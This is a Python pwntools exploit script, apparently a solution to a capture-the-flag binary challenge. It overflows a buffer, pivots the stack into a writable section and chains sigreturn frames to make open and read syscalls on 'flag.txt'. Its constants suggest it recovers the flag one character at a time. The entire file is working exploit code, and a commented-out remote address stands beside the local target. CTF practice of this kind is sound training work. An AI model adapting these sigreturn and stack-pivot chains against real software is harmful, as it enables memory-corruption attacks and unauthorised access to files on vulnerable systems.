#!/usr/bin/python3

from pwn import *

exe = ELF('challe', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe
CHAR = ord("S")
POS = 1

def GDB():
    context.terminal = ["foot"]
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                # b* 0x000000000040102a
                #
                # c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    # p = remote("209.126.9.222", 5000)
    p = remote("localhost", 5000)
else:
    p = process("./run chall".split())


# Phase 1: Sigreturn
rw_section = 0x402000 + 0xa00
syscall = 0x000000000040102a
leave_ret = 0x000000000040102c
ret = 0x000000000040102d

frame = SigreturnFrame(arch='amd64')
frame.rax = 0
frame.rbx = 0xdeadbeef
frame.rcx = 0xdeadbeef
frame.rdx = 0x800
frame.rdi = 0
frame.rsi = rw_section - 0x500
frame.rsp = rw_section
frame.rbp = rw_section - 0x500
frame.rip = syscall
frame_parts = [bytes(frame)[i:i+0x20] for i in range(0, len(frame), 0x20)]

pl = b'A'*0x40 + p64(rw_section) + p64(exe.sym.main + 8)
s(pl)

pl = p64(ret)*3 + p64(syscall) + \
    frame_parts[0].ljust(0x20, b'\0') + \
    p64(rw_section+0x20*2) + p64(exe.sym.main + 8)
s(pl)
for i in range(1, len(frame_parts)-1):
    pl = frame_parts[i].ljust(0x40, b'\0') + \
        p64(rw_section+0x20*(i+2)) + \
        p64(exe.sym.main + 8)
    s(pl)
pl = frame_parts[-1].ljust(0x40, b'\0') + \
    p64(rw_section-0x40) + p64(exe.sym.main + 8)
s(pl)
s(b'A'*0xf)

# Phase 2: open file
rw_section -= 0x500

input('Phase 2')
frame1 = SigreturnFrame(arch='amd64')
frame1.rax = 2
frame1.rbx = 0xdeadbeef
frame1.rcx = 0xdeadbeef
frame1.rdx = 0
frame1.rdi = rw_section + 0x7e0
frame1.rsi = 0
frame1.rsp = rw_section
frame1.rbp = rw_section
frame1.rip = syscall
frame_parts = bytearray(bytes(frame1))
pl = flat(
    rw_section + 8, exe.sym.main + 8, syscall, 1, frame_parts[8:]
)
pl = pl.ljust(0x180, b'P')
frame2 = SigreturnFrame(arch='amd64')
frame2.rax = 0
frame2.rbx = 0xdeadbeef
frame2.rcx = 0xdeadbeef
frame2.rdx = 0x100
frame2.rdi = 3
frame2.rsi = rw_section + 0x7e0+0x100
frame2.rsp = 0
frame2.rbp = rw_section + 0x180*2
frame2.rip = syscall
pl += flat(
    rw_section + 0x180 + 8, exe.sym.main + 8, syscall, bytes(frame2)
    )
pl = pl.ljust(0x180*2, b'a')

frame3 = SigreturnFrame(arch='amd64')
frame3.rax = 2
frame3.rbx = 0xdeadbeef
frame3.rcx = 0xdeadbeef
frame3.rdx = 2
frame3.rdi = rw_section + 0x7e0
frame3.rsi = rw_section + 0x7e0+0x100+ POS
frame3.rsp = 0
frame3.rbp = rw_section + 0x180*3
frame3.rip = syscall
pl += flat(
    rw_section + 0x180*2 + 8, exe.sym.main + 8 , syscall, bytes(frame3)
    )
pl = pl.ljust(0x180*3, b'a')
pl += flat(0x402998,0x40102E,  0x401025, 0x4029b0-8, syscall, 0x4029b0, 0x0000000000401010 )

pl = pl.ljust(0x7e0, b'P')
pl += b'flag.txt\0'
s(pl)
for i in range(CHAR-2):
    # input('Phase 2: send 0xf (1 time)')
    sleep(0.1)
    s(b'A'*0xf)


payload = flat (
        b'\x00' * 64,
        0x402680,
        leave_ret
        )
s(payload)

input('Phase 2: send 0xf (1 time)')
s(b'A'*0xf)
# GDB()
input('Phase 2: send 0xf (1 time)')
s(b'A'*0xf)
# s(b'\0')
p.interactive()
# CSCTF{
